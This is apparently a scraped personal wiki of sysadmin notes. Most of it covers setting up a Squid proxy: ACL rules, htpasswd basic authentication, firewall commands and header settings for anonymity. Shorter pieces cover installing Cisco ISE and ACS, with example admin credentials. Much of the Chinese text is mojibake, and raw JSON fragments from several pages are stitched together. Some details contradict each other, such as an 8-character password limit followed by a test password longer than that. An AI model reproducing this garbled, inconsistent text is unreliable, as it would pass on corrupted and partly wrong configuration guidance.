&quot;localhost&quot; is a local user#http_access deny to_localhost## INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS## Example rule allowing access from your local networks.# Adapt localnet in the ACL section to list your (internal) IP networks# from where browsing should be allowedhttp_access allow localnethttp_access allow localhost# And finally deny all other access to this proxyhttp_access deny all# Squid normally listens to port 3128http_port 3128# Uncomment and adjust the following to add a disk cache directory.#cache_dir ufs /var/spool/squid 100 16 256# Leave coredumps in the first cache dircoredump_dir /var/spool/squid## Add any of your own refresh_pattern entries above these.#refresh_pattern ^ftp: 1440\t20%\t10080refresh_pattern ^gopher:\t1440\t0%\t1440refresh_pattern -i (/cgi-bin/|\\?) 0\t0%\t0refresh_pattern . 0\t20%\t4320 ç®€ç•¥ç‰ˆè§£è¯»è¯¦å°½ç‰ˆè§£è¯» The first section sets up ACLs (Access Control Lists) for different types of networks and ports. The acl localnet lines define IP address ranges that are allowed to access the proxy, while the acl SSL_ports and acl Safe_ports lines specify which ports are allowed for HTTPS and other protocols respectively. The second section specifies the minimum access permissions that should be configured for the proxy. The http_access deny lines restrict access to unsafe ports and disallow CONNECT to non-SSL ports, while http_access allow lines allow access to the local network and localhost. The third section sets up the port that Squid listens on (default is 3128) and specifies the directory where core dumps should be stored in case of a crash. The fourth section defines the refresh patterns for cached objects. These rules determine how long cached objects should be kept and how often they should be refreshed. ACL Section The acl localnet lines define IP address ranges that are allowed to access the proxy. By default, the ACL allows access from the RFC1918 private IP address ranges (10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16), as well as from the fc00::/7 and fe80::/10 address ranges. The acl SSL_ports line specifies the HTTPS port (443) as the only port that should be allowed for secure connections. The acl Safe_ports lines list several ports that should be allowed for various types of traffic, such as HTTP (port 80), FTP (port 21), HTTPS (port 443), and others. The acl CONNECT method CONNECT line allows the CONNECT method, which is used for establishing SSL tunnel connections. Access Permission Section The http_access deny lines specify which types of requests should be denied. The !Safe_ports argument after deny blocks all requests to ports other than those listed in Safe_ports. The CONNECT !SSL_ports argument after deny blocks all SSL tunnel requests to non-HTTPS ports. The http_access allow lines specify which types of requests should be allowed. The localhost argument after allow allows requests originating from the proxy host itself. The localnet argument after allow allows requests originating from the IP ranges defined in the acl localnet section. The http_access deny all line blocks all other requests, effectively restricting access to the proxy to only those specified in the http_access allow lines. Port and Core Dump Directory Section The http_port line specifies the port on which Squid should listen for incoming connections. By default, this is set to port 3128. The coredump_dir line specifies the directory where core dump files should be stored in case of a crash. By default, this is set to /var/spool/squid. Refresh Pattern Section The refresh_pattern lines specify how frequently Squid should check for new versions of cached objects. The first argument (^ftp: and ^gopher:) specifies which types of requests the pattern should match. The second argument (1440 and 0) specifies the number of minutes after which Squid should check for updates. The third argument (20% and 0%) specifies the percentage of the objectâ€™s age that should be used to determine when to refresh the object. The fourth argument (10080 and 1440) specifies the maximum age of the object in minutes before it should be removed from the cache. The -i (/cgi-bin/|\\?) line specifies a regular expression to match URLs that should never be cached, and the final refresh_pattern . line specifies that all other URLs should be refreshed according to the other refresh pattern rules. ç«¯å£ 12# Squid normally listens to port 3128http_port 3128 é»˜è®¤ç«¯å£3128ã€‚å¦‚æœå¯¹å¤–æ˜¯åŠ¨æ€åˆ†é…çš„ï¼Œåˆ™æ— æ³•å›ºå®šIPã€‚å¦‚æœéœ€è¦å¯¹å†…éƒ¨çš„å±€åŸŸç½‘æœåŠ¡ï¼Œå¯å†™æˆï¼š 1http_port 192.168.228.180:3128 è®¿é—®æ§åˆ¶åˆ—è¡¨ squidä»ä¸Šå¾€ä¸‹è¯»å–aclè§„åˆ™ï¼Œå½“ä¸€ä¸ªè§„åˆ™åŒ¹é…åˆ°æ—¶ï¼Œå°±ä¼šå…è®¸ï¼Œå°±ä¸å†å¾€ä¸‹åŒ¹é…ï¼Œæ‰€ä»¥aclçš„é¡ºåºå¾ˆé‡è¦ã€‚ squidå¯é€šè¿‡IPåœ°å€ã€ä¸»æœºåã€MACåœ°å€ã€ç”¨æˆ·/å¯†ç è®¤è¯ç­‰æ–¹å¼è¯†åˆ«åŠæ§åˆ¶å¯¹å¤–è®¿é—®ï¼Œè¿˜å¯é™åˆ¶æ—¶é—´æ®µç­‰ã€‚ ACLçš„åŸºæœ¬æ ¼å¼æ˜¯ï¼š 1acl åˆ—è¡¨åç§° æ§åˆ¶æ–¹å¼ æ§åˆ¶ç›®æ ‡ å¦‚æœæ˜¯è™šæ‹Ÿæœºç¯å¢ƒï¼Œå› ä¸ºsquidé…ç½®æ–‡ä»¶ä¸­é»˜è®¤å…è®¸ç§æœ‰åœ°å€192.168.0.0/16ä½¿ç”¨squidä»£ç†ï¼Œæ‰€ä»¥åªè¦ç¡®ä¿squidå¯åŠ¨ï¼Œå°±èƒ½è®©å…¶ä»–å†…ç½‘è™šæ‹Ÿæœºæ¥ä½¿ç”¨è¯¥ä»£ç†ï¼Œç‚¹æ­¤è·³è½¬åˆ°å¦‚ä½•ä½¿ç”¨ ä¸å»ºè®®http_access allow allï¼Œç›´æ¥æ”¾è¡Œæ‰€æœ‰httpè¯·æ±‚æ¥æºï¼Œå¦‚æœæ˜¯è‡ªå·±æ­å»ºçš„æµ‹è¯•ç¯å¢ƒï¼Œåˆ™æ— æ‰€è°“ æ£€æŸ¥é…ç½®æ–‡ä»¶ ä½¿ç”¨è¯¥å‘½ä»¤æ£€æŸ¥é…ç½®æ˜¯å¦æœ‰è¯¯ï¼Œå¦‚æœæœ‰è¯¯ï¼Œä¼šè¾“å‡ºç›¸åº”é”™è¯¯ï¼Œå¦‚æœæ— è¯¯ï¼Œä¼šè¾“å‡ºå…·ä½“é…ç½®ä¿¡æ¯ 1squid -k parse é˜²ç«å¢™æ”¾è¡Œ3128ç«¯å£ 1234567891011121314 # æŠŠ 3128 ç«¯å£åŠ å…¥é˜²ç«å¢™è¿‡æ»¤æ‰ # firewall-cmd --permanent --zone=public --add-port=3128/tcp # é‡å¯é˜²ç«å¢™ # firewall-cmd --reloadâ€‹\tå¦‚æœSquidåœ¨å¦ä¸€ä¸ªéé»˜è®¤ç«¯å£ä¸Šè¿è¡Œï¼Œåˆ™éœ€è¦å…è®¸è¯¥ç«¯å£ä¸Šçš„æµé‡é€šè¿‡ã€‚4. åŸºç¡€å‘½ä»¤ åˆå§‹åŒ–æœåŠ¡ï¼ˆè®°ä¸€ä¸‹ï¼Œä¸ä¸€å®šè¦è¿è¡Œï¼‰ ~~~shell squid -z å¯åŠ¨ã€é‡å¯ã€å¼€æœºè‡ªå¯åŠ¨å‘½ä»¤ï¼š 123systemctl start squidsystemctl restart squidsystemctl enable squid æŸ¥çœ‹squidçŠ¶æ€ 1systemctl status squid å…³é—­æ—¶å»ºè®®ä½¿ç”¨ 1squid -k shutdown å¾ªç¯è¯»å–æ˜¾ç¤ºæ—¥å¿— 1squid -ztail -f /var/log/squid/access.log é…ç½®è®¤è¯ä»£ç† å¢åŠ ç”¨æˆ·åå¯†ç çš„è®¤è¯æ–¹å¼æ¥åšæƒé™æ§åˆ¶ éœ€è¦å®‰è£…htpasswdï¼Œè¯¥å·¥å…·é›†æˆåœ¨apache httpdçš„toolsé‡Œ 1yum install httpd-tools -y å®‰è£…å®Œæˆä¹‹åæ‰§è¡Œ htpasswdï¼Œå¦‚æœæ²¡æœ‰æç¤ºæ‰¾ä¸åˆ°å‘½ä»¤ï¼Œåˆ™è¯´æ˜å®‰è£…æˆåŠŸã€‚ æ¥ä¸‹æ¥åˆ›å»ºä¿å­˜ç”¨æˆ·åå¯†ç çš„æ–‡ä»¶ï¼š 12touch /etc/squid/squid_passwdchown squid /etc/squid/squid_passwd æ³¨æ„æˆæƒçš„æ—¶å€™è¦å¼„æ¸…æ¥šsquidè¿è¡Œæ—¶çš„ç”¨æˆ·åï¼Œä¸€èˆ¬æ˜¯squidæˆ–è€…proxyã€‚ ç„¶åæ‰§è¡Œï¼š 1234htpasswd /etc/squid/squid_passwd usernameNew password:Re-type new password:Adding password for user username æ³¨æ„æŠŠ username æ¢æˆä½ æƒ³è¦çš„ç”¨æˆ·åï¼Œå¯†ç ä½æ•°ä¸èƒ½è¶…è¿‡8ä½ã€‚æ¯”å¦‚æˆ‘è¿™é‡Œè´¦æˆ·åè®¾usernameï¼Œå¯†ç ä¸ºadmin å¦‚æœæƒ³è¦ç»§ç»­æ·»åŠ ç”¨æˆ·ï¼Œè¯·å¤šæ¬¡æ‰§è¡Œè¿™æ¡å‘½ä»¤ã€‚ å‘½ä»¤æ ¼å¼ï¼š htpasswd [é€‰é¡¹] æ–‡ä»¶å ç”¨æˆ·å å¸¸ç”¨é€‰é¡¹ -c åˆ›å»ºæ–°æ–‡ä»¶ï¼Œå¦‚æœæ²¡åŠ æ­¤é€‰é¡¹ä¼šæŠŠæ–°å¢çš„ç”¨æˆ·æ·»åŠ åœ¨æœ«å°¾ -2 SHA-256æ ¼å¼çš„å¯†ç  -5 SHA-512æ ¼å¼çš„å¯†ç  -B bcryptæ ¼å¼çš„å¯†ç  -d CRYPTæ ¼å¼çš„å¯†ç  -s SHA-1æ ¼å¼çš„å¯†ç  æŸ¥çœ‹éªŒè¯æ–‡ä»¶ï¼Œå®‰è£…squidæ—¶ä¼šè‡ªåŠ¨è£…ä¸Šè¿™ä¸ªéªŒè¯æ–‡ä»¶ 123[root@localhost user]# rpm -ql squid | grep ncsa/usr/lib64/squid/basic_ncsa_auth/usr/share/man/man8/basic_ncsa_auth.8.gz æµ‹è¯•å¯†ç æ–‡ä»¶ 1234[root@localhost user]# /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdusername Admin@123OK# æµ‹è¯•å®Œæˆï¼Œcrtl + c æ‰“æ–­ æ¥ä¸‹æ¥ä¿®æ”¹ /etc/squid/squid.conf æ–‡ä»¶è®©squidä½¿ç”¨éªŒè¯ï¼Œåœ¨ http_access deny all ä¹‹å‰åŠ ä¸Šä¸‹é¢å‡ å¥ï¼š æ³¨é‡Šç‰ˆç›´æ¥å¤åˆ¶ç‰ˆ123456789auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd #é€‰æ‹©çš„è®¤è¯æ–¹å¼ä¸ºbasicï¼Œè®¤è¯ç¨‹åºè·¯å¾„å’Œå¯†ç æ–‡ä»¶è·¯å¾„ #æ³¨æ„ç¬¬ä¸€ä¸ªæ–‡ä»¶è·¯å¾„è¦å’Œåˆšæ‰rpm -ql squid | grep ncsaæ‰¾çš„è·¯å¾„ä¸€æ ·ï¼Œç¬¬äºŒä¸ªæ–‡ä»¶è·¯å¾„æ˜¯ä¹‹å‰åˆ›å»ºç”¨äºä¿å­˜ç”¨æˆ·åå¯†ç çš„å¯†ç æ–‡ä»¶è·¯å¾„auth_param basic children 5 #è®¤è¯ç¨‹åºçš„è¿›ç¨‹æ•°ï¼Œæœ€å¤š5ä¸ªè´¦æˆ·åŒæ—¶è¿è¡Œauth_param basic realm Squid proxy-caching web server #ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå¯†ç æ—¶çœ‹åˆ°çš„æç¤ºä¿¡æ¯auth_param basic credentialsttl 2 hours #è®¤è¯æœ‰æ•ˆæ—¶é—´ï¼Œç”¨æˆ·åå’Œå¯†ç çš„ç¼“å­˜æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è¯´åŒä¸€ä¸ªç”¨æˆ·åå¤šä¹…ä¼šè°ƒç”¨ ncsa_auth ä¸€æ¬¡auth_param basic casesensitive off #ç”¨æˆ·åæ˜¯å¦éœ€è¦åŒ¹é…å¤§å°å†™acl ncsa_users proxy_auth REQUIRED #æ‰€æœ‰æˆåŠŸé‰´æƒçš„ç”¨æˆ·éƒ½å½’äº ncsa_users ç»„http_access allow ncsa_users #å…è®¸ ncsa_users ç»„çš„ç”¨æˆ·ä½¿ç”¨ Proxy1234567auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdauth_param basic children 5auth_param basic realm Squid proxy-caching web serverauth_param basic credentialsttl 2 hoursauth_param basic casesensitive offacl ncsa_users proxy_auth REQUIREDhttp_access allow ncsa_users æç¤ºæœ€åè¯´ä¸€ä¸ªå°å‘ï¼Œapache httpd 2.2 ç‰ˆæœ¬å’Œ 2.4 ç‰ˆæœ¬çš„ htpasswd ç”Ÿæˆçš„å¯†ç æ–‡ä»¶æ ¼å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚åªæœ‰ 2.2 ç‰ˆæœ¬çš„èƒ½ç”¨ã€‚å¦‚æœæŒ‰ç…§æ•™ç¨‹è®¾ç½®æˆåŠŸä»¥åå‘ç°ç”¨æˆ·åå¯†ç æ­»æ´»ä¸å¯¹ï¼Œæ–‡ä»¶æƒé™ä¹Ÿæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œé‚£å°±è¦çœ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯ htpasswd çš„é—®é¢˜äº†ã€‚ ç›´æ¥è¾“å…¥ /usr/lib/squid/ncsa_auth /etc/squid/squid_passwd ç„¶åè¾“å…¥ username passwd å¯ä»¥æ‰‹åŠ¨è¿è¡Œä¸€ä¸‹ ncsa_auth ç¨‹åºï¼Œçœ‹çœ‹æ˜¯å¦æ˜¯å¯†ç æ–‡ä»¶çš„é—®é¢˜ã€‚ å¦‚æœæç¤º OK é‚£ä¹ˆè¯´æ˜æ²¡æœ‰é—®é¢˜ï¼Œæç¤º ERR Wrong password åˆ™è¯´æ˜è¦ä¹ˆæ˜¯å¯†ç è¾“é”™äº†ï¼Œè¦ä¹ˆæ˜¯å¯†ç æ–‡ä»¶çš„æ ¼å¼æœ‰é—®é¢˜ã€‚ ä¸€ä¸ªä¾‹å­ 1vi /etc/squid/squid.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384## Recommended minimum configuration:## Example rule allowing access from your local networks.# Adapt to list your (internal) IP networks from where browsing# should be allowedacl localnet src 10.0.0.0/8\t# RFC1918 possible internal networkacl localnet src 172.16.0.0/12\t# RFC1918 possible internal networkacl localnet src 192.168.0.0/16\t# RFC1918 possible internal networkacl localnet src fc00::/7 # RFC 4193 local private network rangeacl localnet src fe80::/10 # RFC 4291 link-local (directly plugged) machinesacl SSL_ports port 443acl Safe_ports port 80 # httpacl Safe_ports port 21 # ftpacl Safe_ports port 443 # httpsacl Safe_ports port 70 # gopheracl Safe_ports port 210 # waisacl Safe_ports port 1025-65535\t# unregistered portsacl Safe_ports port 280 # http-mgmtacl Safe_ports port 488 # gss-httpacl Safe_ports port 591 # filemakeracl Safe_ports port 777 # multiling httpacl CONNECT method CONNECT+ acl client src 192.168.242.165+ http_access allow client+ auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd+ auth_param basic children 5+ auth_param basic realm Squid proxy-caching web server+ auth_param basic credentialsttl 2 hours+ auth_param basic casesensitive off+ acl ncsa_users proxy_auth REQUIRED+ http_access allow ncsa_users## Recommended minimum Access Permission configuration:## Deny requests to certain unsafe portshttp_access deny !Safe_ports# Deny CONNECT to other than secure SSL portshttp_access deny CONNECT !SSL_ports# Only allow cachemgr access from localhosthttp_access allow localhost managerhttp_access deny manager# We strongly recommend the following be uncommented to protect innocent# web applications running on the proxy server who think the only# one who can access services on &quot;localhost&quot; is a local user#http_access deny to_localhost## INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS## Example rule allowing access from your local networks.# Adapt localnet in the ACL section to list your (internal) IP networks# from where browsing should be allowedhttp_access allow localnethttp_access allow localhost# And finally deny all other access to this proxyhttp_access deny all# Squid normally listens to port 3128http_port 3128# Uncomment and adjust the following to add a disk cache directory.#cache_dir ufs /var/spool/squid 100 16 256# Leave coredumps in the first cache dircoredump_dir /var/spool/squid## Add any of your own refresh_pattern entries above these.#refresh_pattern ^ftp: 1440\t20%\t10080refresh_pattern ^gopher:\t1440\t0%\t1440refresh_pattern -i (/cgi-bin/|\\?) 0\t0%\t0refresh_pattern . 0\t20%\t4320 å®¢æˆ·ç«¯ipä¸º192.168.242.165ä¸éœ€è¦éªŒè¯ï¼Œç›´æ¥èƒ½ä½¿ç”¨ä»£ç†ä¸Šç½‘ã€‚ 12acl client src 192.168.242.165http_access allow client å…¶ä»–èƒ½access the proxyçš„å®¢æˆ·ç«¯éƒ½è¦è®¤è¯ 1234567auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdauth_param basic children 5auth_param basic realm Squid proxy-caching web serverauth_param basic credentialsttl 2 hoursauth_param basic casesensitive offacl ncsa_users proxy_auth REQUIREDhttp_access allow ncsa_users å¦‚æœå»æ‰ åˆ å‡å†…å®¹å®Œæ•´ç‰ˆ1- http_access allow client123456789acl client src 192.168.242.165auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdauth_param basic children 5auth_param basic realm Squid proxy-caching web serverauth_param basic credentialsttl 2 hoursauth_param basic casesensitive offacl ncsa_users proxy_auth REQUIREDhttp_access allow ncsa_users 192.168.242.165ä¸Šç½‘ä¹Ÿéœ€è¦è®¤è¯ï¼Œä¸ºä»€ä¹ˆï¼Ÿä»ç°åœ¨çš„confçœ‹ï¼Œaclåªæ˜¯å®šä¹‰äº†clientç»„ï¼Œclientç»„é‡Œæœ‰192.168.242.165è¿™ä¸ªå®¢æˆ·ç«¯ï¼Œç„¶åé‡åˆ°è®¤è¯çš„é‚£å‡ æ¡ï¼Œå¹¶ä¸”åªå…è®¸è®¤è¯åçš„å®¢æˆ·ç«¯çš„è¯·æ±‚http_access allow ncsa_usersã€‚ åŸå› ï¼š In your squid configuration file, the line â€œacl client src 192.168.242.165â€ defines an access control list (ACL) named â€œclientâ€ that includes only the IP address 192.168.242.165. The next line â€œhttp_access allow clientâ€ grants access to this ACL without requiring authentication. Therefore, any client with the IP address 192.168.242.165 will be able to access the proxy server without authentication. If you remove the line â€œhttp_access allow clientâ€, all clients will require authentication including the client with the IP address 192.168.242.165. Regarding the question about the need for authentication for clients on the localnet, the ACL â€œlocalnetâ€ includes IP addresses from 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16, which cover a range of private IP addresses. However, this does not automatically grant access to these clients without authentication. You still need to define an ACL and grant access accordingly, as you have done with the â€œclientâ€ ACL in your configuration file. å› ä¸ºaclåªæ˜¯å®šä¹‰äº†ä¸€ä¸ªè¯·æ±‚æˆ–å®¢æˆ·ç«¯æ˜¯å¦å…è®¸æˆ–æ‹’ç»è®¿é—®ä»£ç†æœåŠ¡å™¨çš„æ¡ä»¶ï¼Œè€Œhttp_accessè§„åˆ™ç¡®å®šäº†æ ¹æ®è¿™äº›æ¡ä»¶çš„ç»“æœåº”è¯¥é‡‡å–çš„è¡ŒåŠ¨ã€‚å®ƒä»¬è¦ä¸€èµ·æ­é…ä½¿ç”¨ã€‚ An access control list (ACL) in Squid is used to define a list of conditions that are used to match requests or clients. ACLs are used in combination with http_access rules to determine which requests or clients are allowed to access the proxy server. http_access rules in Squid are used to define the access policy for incoming requests. They are used to control which clients or requests are allowed or denied access to the proxy server, based on the conditions defined in the ACLs. In other words, ACLs define the conditions that are used to determine whether a request or client is allowed or denied access to the proxy server, while http_access rules determine the actions that should be taken based on the results of these conditions. For example, you might define an ACL that matches requests from a particular domain name, and then use an http_access rule to allow or deny access based on that ACL. Or, you might define an ACL that matches a particular IP address range, and then use an http_access rule to grant or deny access based on that ACL. Overall, ACLs and http_access rules work together to provide granular control over which clients or requests are allowed to access the proxy server, and what actions should be taken for each request or client. è¿›é˜¶é…ç½®ï¼ˆæœªè¯•ï¼Œåªæ˜¯è®°å½•ï¼‰ åŒ¿å é»˜è®¤æƒ…å†µä¸‹ï¼ŒSquid ä¼šæ·»åŠ å¾ˆå¤šå’Œå®¢æˆ·ä¿¡æ¯ç›¸å…³çš„ HTTP å¤´ï¼Œå¦‚ X-Forwarded-For è¿™ç±»ã€‚å¦‚æœæƒ³è¦åšåˆ°é«˜åº¦åŒ¿åï¼Œéœ€è¦å°†è¿™äº›å¤´å»æ‰ã€‚åœ¨ squid.conf é‡Œé¢æ·»åŠ å¦‚ä¸‹çš„é…ç½®ï¼š 123456789101112131415161718192021222324252627282930forwarded_for offrequest_header_access Allow allow allrequest_header_access Authorization allow allrequest_header_access WWW-Authenticate allow allrequest_header_access Proxy-Authorization allow allrequest_header_access Proxy-Authenticate allow allrequest_header_access Cache-Control allow allrequest_header_access Content-Encoding allow allrequest_header_access Content-Length allow allrequest_header_access Content-Type allow allrequest_header_access Date allow allrequest_header_access Expires allow allrequest_header_access Host allow allrequest_header_access If-Modified-Since allow allrequest_header_access Last-Modified allow allrequest_header_access Location allow allrequest_header_access Pragma allow allrequest_header_access Accept allow allrequest_header_access Accept-Charset allow allrequest_header_access Accept-Encoding allow allrequest_header_access Accept-Language allow allrequest_header_access Content-Language allow allrequest_header_access Mime-Version allow allrequest_header_access Retry-After allow allrequest_header_access Title allow allrequest_header_access Connection allow allrequest_header_access Proxy-Connection allow allrequest_header_access User-Agent allow allrequest_header_access Cookie allow allrequest_header_access All deny all ä¹Ÿçœ‹åˆ°å¦ä¸€ç§é«˜åŒ¿å†™æ³•ï¼š 123request_header_access X-Forwarded-For deny allrequest_header_access From deny allrequest_header_access Via deny all å»é™¤ç›¸å…³ä¸»æœºä¿¡æ¯ é»˜è®¤æƒ…å†µä¸‹ï¼ŒSquid ä¼šæŠŠä¸»æœºç›¸å…³çš„ä¿¡æ¯å‘é€å‡ºå»ï¼Œå¹¶æ˜¾ç¤ºåœ¨é”™è¯¯é¡µé¢ã€‚åŠ ä¸Šä¸‹é¢ä¸¤å¥å»æ‰è¿™äº›ä¿¡æ¯ï¼š 1234# add this to /etc/squid/squid.confvisible_hostname mybogusproxyhostname.local# and while we are at it stop squid blabbing about it&#x27;s version aswellhttpd_suppress_version_string on ä½¿ç”¨ä»£ç† Windows è€ç‰ˆæœ¬ieæµè§ˆå™¨ï¼ˆæ¯”å¦‚win7ä¸‹çš„ï¼‰ï¼Œåœ¨ieæµè§ˆå™¨ å¦‚æœæœ‰è®¤è¯ï¼Œä¼šå¼¹çª— Googleæµè§ˆå™¨,ä½¿ç”¨é»˜è®¤çš„ç³»ç»Ÿä»£ç†ã€‚ Edgeæµè§ˆå™¨ï¼Œè®¤è¯å¼¹çª—é•¿è¿™æ ·ï¼š è¡¨å•ä¿å­˜ Firefox å¸¸è§„-è¿æ¥è®¾ç½® ä½¿ç”¨å ä½¿ç”¨ä»£ç†çš„æœºå™¨ï¼Œå¯ä»¥çœ‹åˆ°ä¸ä»£ç†æœåŠ¡å™¨ä¹‹é—´çš„å»ºè¿ï¼ˆè¯·æ±‚ä¸€ä¸ªç½‘é¡µæ˜¯å¤šæ–‡ä»¶è¯·æ±‚ï¼Œæ‰€ä»¥ä¼šæœ‰å¤šè¿æ¥ï¼‰ squidä¸Šçš„æ—¥å¿—å¯ä»¥çœ‹åˆ° Linux [Linuxæ­å»ºsquidæœåŠ¡å®ç°å†…ç½‘æœºå™¨ä»£ç†ä¸Šç½‘]"},{"title":"Cisco ISE","path":"/wiki/network_security_devices_env/Cisco_ISE.html","content":"äº§å“é“¾æ¥https://www.cisco.com/c/en/us/support/security/identity-services-engine/series.html#~tab-models å®˜æ–¹ä¸‹è½½é¡µé¢https://software.cisco.com/download/home/283801620/type/283802505/release/3.3.0?i=!pp ç¬¬ä¸‰æ–¹çš„ä¸‹è½½é“¾æ¥æ±‡æ€»https://sysin.org/blog/cisco-ise-3/ SNS 37x5ï¼šè¿™æ˜¯Ciscoçš„ç‰¹å®šç¡¬ä»¶å‹å·ã€‚ 3.3.0ï¼šè¿™æ˜¯Cisco ISEçš„è½¯ä»¶ç‰ˆæœ¬ã€‚ HP-3.2-CSCwf02093å’ŒHP-CSCwd45843ï¼šè¿™äº›æ˜¯ç‰¹å®šçš„è¡¥ä¸å’Œæ›´æ–° è¦è™šæ‹Ÿæœºå®‰è£…çš„è¯ï¼Œé€‰æ‹©3.3.0é‡Œåç¼€ä¸ºovfæ–‡ä»¶ã€‚å¦‚æœåªæ˜¯æƒ³è¿›è¡Œè¯„ä¼°ï¼Œé‚£ä¹ˆå¯ä»¥é€‰æ‹©â€œISE 3.3 OVA file - 300GB disk for Eval, Small, Medium (Recommend for Evaluation, PSN or PxGrid)â€ã€‚ æˆ–è€…è¿™ä¸ªCisco ISE Software Version 3.3 full installation. This ISO file can be used for installing ISE on SNS-36x5, SNS-37x5 Appliances, SNS-36x5 Servers as well as a VM installation on VMWare.ï¼Œæ˜¯ä¸ªisoæ–‡ä»¶ï¼ŒVMå®‰è£…æ—¶è‡ªå®šä¹‰å®‰è£…ï¼Œå’ŒACSè¿‡ç¨‹ç±»ä¼¼ã€‚ ä½¿ç”¨VMæ‰“å¼€ovaï¼ŒEvalï¼Œè¯„ä¼°ç‰ˆ æŠŠ2-6çš„ç½‘ç»œé€‚é…å™¨åˆ æ‰ï¼Œåªç•™ä¸‹ä¸€ä¸ªï¼ŒNATæ¨¡å¼ setup å’ŒACSå®‰è£…è¿‡ç¨‹ç±»ä¼¼ é…ç½®é¡¹ å†…å®¹ å¤‡æ³¨ name ISE IP address 192.168.147.192 netmask 255.255.255.0 gateway 192.168.147.2 DNS domain cisco.com ä¸èƒ½æ˜¯ipåœ°å€ primary nameserver 8.8.8.8 secondary nameserver 192.168.147.2 NTP Enter å°±æ˜¯é»˜è®¤çš„ system timezone Enter SSH Y username admin password P@ssw0rd CLIå¸¸ç”¨å‘½ä»¤ Cisco ISEçš„CLIï¼ˆå‘½ä»¤è¡Œæ¥å£ï¼‰ä¸­æœ‰è®¸å¤šå¸¸ç”¨çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å¯ä»¥å¸®åŠ©æ‚¨ç®¡ç†å’Œç»´æŠ¤æ‚¨çš„ISEè®¾å¤‡ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼š show application status iseï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæ˜¾ç¤ºISEåº”ç”¨çš„çŠ¶æ€ã€‚å®ƒå¯ä»¥å‘Šè¯‰æ‚¨å“ªäº›æœåŠ¡æ­£åœ¨è¿è¡Œï¼Œå“ªäº›æœåŠ¡å·²ç»åœæ­¢ã€‚ application start iseï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºå¯åŠ¨ISEåº”ç”¨ã€‚ application stop iseï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºåœæ­¢ISEåº”ç”¨ã€‚ show running-configï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæ˜¾ç¤ºå½“å‰çš„è¿è¡Œé…ç½®ã€‚ show versionï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæ˜¾ç¤ºISEçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚ ä¸ºäº†èƒ½å¤Ÿè®¿é—®webç•Œé¢ï¼Œä»¥ä¸‹çš„è¿›ç¨‹éœ€è¦å¤„äºrunningçŠ¶æ€ï¼š Application Serverï¼šè¿™æ˜¯ISEçš„ä¸»è¦æœåŠ¡ï¼Œè´Ÿè´£å¤„ç†æ‰€æœ‰çš„è®¤è¯å’Œæˆæƒè¯·æ±‚ã€‚ Databaseï¼šè¿™æ˜¯ISEçš„æ•°æ®åº“æœåŠ¡ï¼Œå­˜å‚¨æ‰€æœ‰çš„é…ç½®å’Œè¿è¡Œæ•°æ®ã€‚ Administration ISEï¼šè¿™æ˜¯ISEçš„ç®¡ç†æœåŠ¡ï¼Œè´Ÿè´£æä¾›webç•Œé¢ã€‚ è´¦å·å’Œå¯†ç å°±æ˜¯setupæ—¶è®¾ç½®çš„ã€‚é»˜è®¤å°±æ˜¯90å¤©è¯•ç”¨æœŸ"},{"title":"Cisco ACS","path":"/wiki/network_security_devices_env/Cisco_ACS.html","content":"VMä¸‹è½½å’Œlicç”³è¯· äº§å“ç½‘å€ï¼šCisco Secure Access Control System - Ciscoã€‚ç°å®˜æ–¹å·²ä¸æä¾›æ”¯æŒï¼Œæœ€æ–°ç‰ˆæœ¬5.8.1.4ã€‚å®˜æ–¹çš„ä¸‹è½½é¡µé¢ï¼š ACS 5.8.1 Application Upgrade Packageï¼šè¿™æ˜¯ä¸€ä¸ªåº”ç”¨å‡çº§åŒ…ï¼Œç”¨äºå°†æ‚¨ç°æœ‰çš„Cisco ACSè½¯ä»¶å‡çº§åˆ°5.8.1ç‰ˆæœ¬ã€‚ ACS 5.8.1 USB Installation tool for UCS-3415/3495 and UCS-3515/3595ï¼šè¿™æ˜¯ä¸€ä¸ªUSBå®‰è£…å·¥å…·ï¼Œä¸“ä¸ºUCS-3415/3495å’ŒUCS-3515/3595è®¾å¤‡è®¾è®¡ï¼Œç”¨äºåœ¨è¿™äº›è®¾å¤‡ä¸Šå®‰è£…ACS 5.8.1ã€‚ ACS 5.8.1 FCS Official Versionï¼šè¿™æ˜¯ACS 5.8.1çš„æ­£å¼ç‰ˆæœ¬ï¼ŒFCSä»£è¡¨â€œé¦–æ¬¡å®¢æˆ·å‡ºè´§â€ï¼Œæ„å‘³ç€è¿™æ˜¯å‘å®¢æˆ·æä¾›çš„æ­£å¼å‘å¸ƒç‰ˆæœ¬ã€‚ ç‚¹å‡»ç¬¬ä¸‰ä¸ªè¿›è¡Œä¸‹è½½ï¼Œå¡«å®Œå…¬å¸ä¿¡æ¯åè¿˜æ˜¯ä¸èƒ½ä¸‹ æ‰¾ä¸ªç¬¬ä¸‰æ–¹ä¸‹è½½ï¼Œè§£å‹åå¾—åˆ°ä¸€ä¸ªisoæ–‡ä»¶ï¼Œä¸€ä¸ªlicæ–‡ä»¶ 